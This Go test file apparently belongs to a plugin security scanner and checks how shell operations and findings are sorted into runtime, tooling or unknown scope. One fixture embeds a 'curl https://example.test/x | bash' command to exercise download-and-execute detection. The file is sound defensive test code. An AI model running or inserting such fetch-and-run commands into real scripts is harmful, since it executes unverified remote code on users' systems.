package analyze

import (
	"testing"

	"github.com/SurreptitiousFabric/plug-and-prejudice/internal/report"
)

func TestOperationScopesSeparateRuntimeToolingAndUnknown(t *testing.T) {
	contents := withValidManifest(map[string][]byte{
		"Runtime.qml":       []byte("Process { command: [\"runtime-command\"] }\nproperty string helper: \"scripts/helper.sh\"\n"),
		"scripts/helper.sh": []byte("#!/bin/sh\nhelper-command\n"),
		"scripts/misc.sh":   []byte("#!/bin/sh\nunknown-command\n"),
		"tests/check.sh":    []byte("#!/bin/sh\ntest-command\n"),
	})
	result := Sources(contents)
	scopes := map[string]report.Scope{}
	for _, operation := range result.Operations {
		scopes[operation.Command] = operation.Scope
	}
	if scopes["runtime-command"] != report.ScopeRuntime || scopes["helper-command"] != report.ScopeRuntime {
		t.Fatalf("runtime scope missing: %#v", scopes)
	}
	if scopes["test-command"] != report.ScopeTooling {
		t.Fatalf("tooling scope missing: %#v", scopes)
	}
	if scopes["unknown-command"] != report.ScopeUnknown {
		t.Fatalf("unproven reachability was guessed: %#v", scopes)
	}
}

func TestFindingInheritsRelatedOperationScope(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"Runtime.qml": []byte("Process { command: [\"bash\", \"-c\", \"curl https://example.test/x | bash\"] }\n"),
	}))
	finding := findingByCategory(t, result, "download-and-execute")
	if finding.Scope != report.ScopeRuntime {
		t.Fatalf("finding scope = %q, want runtime: %#v", finding.Scope, finding)
	}
}

func TestRuntimeReachabilityPropagatesThroughInspectableWrapper(t *testing.T) {
	contents := withValidManifest(map[string][]byte{
		"Runtime.qml":  []byte("property string helper: \"bin/launcher\"\n"),
		"bin/launcher": []byte("#!/bin/sh\nexec bin/helper-arm64\n"),
	})
	files := []report.File{{Path: "bin/helper-arm64", Kind: "regular", Binary: &report.Binary{Format: "ELF"}}}
	result := Sources(contents)
	Inventory(files, contents, &result)
	finding := findingByCategory(t, result, "native-binary-metadata")
	if finding.Scope != report.ScopeRuntime {
		t.Fatalf("transitively referenced binary scope = %q, want runtime", finding.Scope)
	}
	if len(result.Unknowns) != 1 || result.Unknowns[0].Category != "native-binary" {
		t.Fatalf("missing native-binary unknown in %#v", result.Unknowns)
	}
	if result.Unknowns[0].Scope != report.ScopeRuntime {
		t.Fatalf("transitively referenced binary scope = %q, want runtime", result.Unknowns[0].Scope)
	}
}

func TestGitIndexCannotTransitivelyPromoteRuntimeScope(t *testing.T) {
	contents := withValidManifest(map[string][]byte{
		"Runtime.qml": []byte("property int selectedIndex: 0\n"),
		".git/index":  []byte("helper.go\x00"),
		"helper.go":   []byte("package main\n"),
	})
	references := runtimeReferencedPaths(contents, nil, nil)
	if references[".git/index"] || references["helper.go"] {
		t.Fatalf("Git metadata promoted runtime reachability: %#v", references)
	}
}

func TestDeclaredRuntimeEntryPointOverridesToolingPathConvention(t *testing.T) {
	contents := map[string][]byte{
		"manifest.json":     []byte(`{"schemaVersion":1,"id":"example.test","name":"Test","version":"1","kinds":["panel"],"entryPoints":{"panel":"tests/payload.qml"}}`),
		"tests/payload.qml": []byte("Process { command: [\"runtime-command\"] }\nproperty string helper: \"tests/helper.sh\"\n"),
		"tests/helper.sh":   []byte("#!/bin/sh\nhelper-command\n"),
	}
	result := Sources(contents)
	for _, operation := range result.Operations {
		if operation.Scope != report.ScopeRuntime {
			t.Fatalf("proven runtime operation %q scope = %q", operation.Command, operation.Scope)
		}
	}
}

func TestUndeclaredEntryPointKeyDoesNotPromoteShellRuntime(t *testing.T) {
	contents := withValidManifest(map[string][]byte{
		"hidden.sh": []byte("#!/bin/sh\nunknown-command\n"),
	})
	contents["manifest.json"] = []byte(`{"schemaVersion":1,"id":"example.test","name":"Test","version":"1","kinds":["panel"],"entryPoints":{"panel":"Panel.qml","unused":"hidden.sh"}}`)
	result := Sources(contents)
	for _, operation := range result.Operations {
		if operation.Command == "unknown-command" && operation.Scope != report.ScopeUnknown {
			t.Fatalf("undeclared entry-point key promoted scope: %#v", operation)
		}
	}
}

func TestToolingBasenameUsesTokensNotSubstrings(t *testing.T) {
	if toolingPath("scripts/latest.sh") {
		t.Fatal("latest.sh was classified as test tooling")
	}
	for _, name := range []string{"scripts/test-helper.sh", "scripts/release.sh", "scripts/check_plugin.sh"} {
		if !toolingPath(name) {
			t.Errorf("conventional tooling path %q was not recognized", name)
		}
	}
}

func TestUnknownInheritsAffectedOperationOrEvidenceScope(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"tests/check.py":    []byte("import subprocess\ncommand = choose()\nsubprocess.run(command)\n"),
		"scripts/broken.py": []byte("def broken(:\n"),
	}))
	if len(result.Unknowns) != 2 {
		t.Fatalf("unknowns = %#v", result.Unknowns)
	}
	scopes := map[string]report.Scope{}
	for _, unknown := range result.Unknowns {
		scopes[string(unknown.Reason)] = unknown.Scope
	}
	if scopes[string(report.UnknownUnresolvedFlow)] != report.ScopeTooling || scopes[string(report.UnknownParserFailure)] != report.ScopeUnknown {
		t.Fatalf("unknown scopes = %#v", scopes)
	}
}
